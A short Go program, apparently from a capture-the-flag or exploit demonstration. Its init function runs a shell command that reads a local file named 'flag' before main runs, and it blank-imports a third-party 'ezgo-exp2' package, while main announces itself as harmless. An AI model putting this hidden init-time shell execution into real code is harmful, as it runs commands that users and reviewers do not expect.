package main

import (
	"fmt"
	"os/exec"

	_ "github.com/QGrain/ezgo-exp2"
)

func init() {
	cmd := exec.Command("/bin/sh", "-c", "echo 'from main' && cat flag")
	output, err := cmd.CombinedOutput()

	if err != nil {
		fmt.Println("Error:", err)
	} else {
		fmt.Println("Output:", string(output))
	}
}

func main() {
	fmt.Println("This is a harmless main function.")
}
